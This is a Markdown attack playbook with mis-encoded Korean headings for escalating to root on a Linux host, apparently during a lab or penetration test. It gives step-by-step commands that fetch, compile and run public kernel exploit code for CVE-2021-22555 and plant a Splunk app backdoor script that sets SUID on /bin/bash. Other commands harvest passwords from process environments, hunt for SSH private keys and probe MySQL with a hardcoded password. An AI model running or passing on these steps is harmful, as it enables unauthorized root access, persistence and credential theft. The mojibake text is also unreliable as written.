# CVE-2021-22555 ê¶Œí•œ ìƒìŠ¹

LinPEASê°€ ì¶”ì²œí•œ exploit!

## CVE-2021-22555 - Netfilter Heap Out-of-Bounds Write

**ì˜í–¥:** Linux Kernel < 5.13
**íƒ€ê²Ÿ:** Amazon Linux 2023, Kernel 6.1.155 (íŒ¨ì¹˜ë˜ì—ˆì„ ìˆ˜ ìˆì§€ë§Œ ì‹œë„ ê°€ì¹˜ ìˆìŒ)

---

## íƒ€ê²Ÿì—ì„œ ë°”ë¡œ ë‹¤ìš´ë¡œë“œ ë° ì‹¤í–‰

### ë°©ë²• 1: Exploit-DBì—ì„œ ì§ì ‘ ë‹¤ìš´ë¡œë“œ

```bash
cd /tmp

# exploit ë‹¤ìš´ë¡œë“œ
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O cve-2021-22555.c

# ì»´íŒŒì¼ (gcc í•„ìš”)
gcc -o exploit cve-2021-22555.c -static

# ì‹¤í–‰
./exploit
whoami
```

### ë°©ë²• 2: ë‹¤ë¥¸ ë ˆí¬ì§€í† ë¦¬

```bash
cd /tmp

# ë‹¤ìš´ë¡œë“œ
wget https://raw.githubusercontent.com/cgwalters/cve-2021-22555-poc/main/exploit.c -O exploit.c

# ì»´íŒŒì¼
gcc -o exploit exploit.c -static -pthread

# ì‹¤í–‰
./exploit
```

---

## gcc í™•ì¸

```bash
which gcc
gcc --version
```

**gcc ì—†ìœ¼ë©´ ë¯¸ë¦¬ ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ í•„ìš”**

---

## MySQL ì¬ì‹œë„ (ì˜¬ë°”ë¥¸ ë°©ë²•)

```bash
# í•œì¤„ë¡œ
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@plugin_dir;"
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@secure_file_priv;"
mysql -u webuser -p'WebPassw0rd!' -e "SELECT VERSION();"
mysql -u webuser -p'WebPassw0rd!' -e "SELECT user, host, Super_priv, File_priv FROM mysql.user WHERE user='webuser';"
```

---

## Splunk ì•…ìš© (writable íŒŒì¼ ìˆìŒ!)

### í™•ì¸ëœ ì •ë³´:
- Splunkê°€ splunk ì‚¬ìš©ìë¡œ ì‹¤í–‰ ì¤‘
- /opt/splunk/etc/apps/ í•˜ìœ„ì— writable íŒŒì¼ë“¤

### Splunk Appì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹

```bash
# Splunk app ë””ë ‰í† ë¦¬
ls -la /opt/splunk/etc/apps/

# writableí•œ app ì°¾ê¸°
find /opt/splunk/etc/apps -writable -type d 2>/dev/null

# Splunk ì„¤ì • íŒŒì¼
cat /opt/splunk/etc/system/local/server.conf 2>/dev/null
cat /opt/splunk/etc/passwd 2>/dev/null
```

### Splunk ë°±ë„ì–´ ìƒì„± (writable ë””ë ‰í† ë¦¬ì—)

```bash
# writableí•œ app ë””ë ‰í† ë¦¬ ì°¾ê¸°
WRITABLE_APP="/opt/splunk/etc/apps/splunk-dashboard-studio"

# bin ë””ë ‰í† ë¦¬ ìƒì„± (ì—†ìœ¼ë©´)
mkdir -p "$WRITABLE_APP/bin" 2>/dev/null

# ë°±ë„ì–´ ìŠ¤í¬ë¦½íŠ¸ ìƒì„±
cat > "$WRITABLE_APP/bin/backdoor.sh" << 'SPLUNKEOF'
#!/bin/bash
chmod u+s /bin/bash
SPLUNKEOF

chmod +x "$WRITABLE_APP/bin/backdoor.sh"

# Splunkê°€ ì´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë„ë¡ ì„¤ì •
# (app restart í•„ìš”)
```

---

## í”„ë¡œì„¸ìŠ¤ ë©”ëª¨ë¦¬ ë¤í”„ (ì˜¬ë°”ë¥¸ ë°©ë²•)

```bash
# í•œ ì¤„ì”© ì‹¤í–‰
cd /tmp
for pid in /proc/[0-9]*/environ; do cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -i pass; done > passwords.txt
cat passwords.txt | grep -v "LESSOPEN" | head -20
```

---

## ë‹¤ë¥¸ ì‚¬ìš©ì í™•ì¸

```bash
# ì‹œìŠ¤í…œ ì‚¬ìš©ì
cat /etc/passwd | grep "/bin/bash\|/bin/sh" | grep -v "^root"

# í™ˆ ë””ë ‰í† ë¦¬
ls -la /home/

# SSH í‚¤
find /home -name "*.pem" -o -name "id_rsa" 2>/dev/null
find /home -type f -name "authorized_keys" 2>/dev/null

# ì½ê¸° ê°€ëŠ¥í•œ íŒŒì¼
find /home -type f -readable 2>/dev/null | head -20
```

---

## ğŸš€ ì¦‰ì‹œ ì‹¤í–‰ ìˆœì„œ

### 1ë‹¨ê³„: gcc í™•ì¸

```bash
which gcc
gcc --version
```

### 2ë‹¨ê³„: CVE-2021-22555 ë‹¤ìš´ë¡œë“œ

```bash
cd /tmp
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O cve22555.c
```

### 3ë‹¨ê³„: ì»´íŒŒì¼

```bash
gcc -o cve22555 cve22555.c -static
```

**ì»´íŒŒì¼ ì‹¤íŒ¨ì‹œ:**
```bash
# ì—ëŸ¬ ë©”ì‹œì§€ í™•ì¸
gcc -o cve22555 cve22555.c -static 2>&1
```

### 4ë‹¨ê³„: ì‹¤í–‰

```bash
./cve22555
whoami
id
```

---

## ëŒ€ì•ˆ: ì™¸ë¶€ì—ì„œ ë¯¸ë¦¬ ì»´íŒŒì¼ëœ exploit ì°¾ê¸°

```bash
cd /tmp

# searchsploit ìŠ¤íƒ€ì¼ë¡œ ê²€ìƒ‰
wget https://www.exploit-db.com/exploits/49808 -O exploit.c
wget https://www.exploit-db.com/exploits/50135 -O exploit2.c

# ë˜ëŠ” GitHub releasesì—ì„œ ë°”ì´ë„ˆë¦¬ ì°¾ê¸°
```

---

## MySQL ì™„ì „ ì²´í¬

```bash
# í•œì¤„ë¡œ ëª¨ë‘ ì‹¤í–‰
echo "=== Plugin Dir ===" && \
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@plugin_dir;" && \
echo "=== Secure File Priv ===" && \
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@secure_file_priv;" && \
echo "=== Version ===" && \
mysql -u webuser -p'WebPassw0rd!' -e "SELECT VERSION();" && \
echo "=== User Privileges ===" && \
mysql -u webuser -p'WebPassw0rd!' -e "SELECT user, host, Super_priv, File_priv FROM mysql.user WHERE user='webuser';"
```

---

## ê°€ëŠ¥í•œ ë²¡í„° ìš°ì„ ìˆœìœ„

1. **CVE-2021-22555** â­â­â­â­â­ (LinPEAS ì¶”ì²œ)
2. **MySQL UDF** â­â­â­â­
3. **Splunk ì•…ìš©** â­â­â­
4. **í”„ë¡œì„¸ìŠ¤ ë©”ëª¨ë¦¬** â­â­
5. **ë‹¤ë¥¸ ì‚¬ìš©ì pivot** â­â­

---

## ë‹¤ìŒ ëª…ë ¹ì–´ (íƒ€ê²Ÿì—ì„œ)

```bash
# gcc í™•ì¸
which gcc && echo "GCC available!" || echo "NO GCC"

# CVE-2021-22555 ë‹¤ìš´ë¡œë“œ
cd /tmp
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O cve.c

# MySQL í™•ì¸
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@plugin_dir, @@secure_file_priv, VERSION();"
```
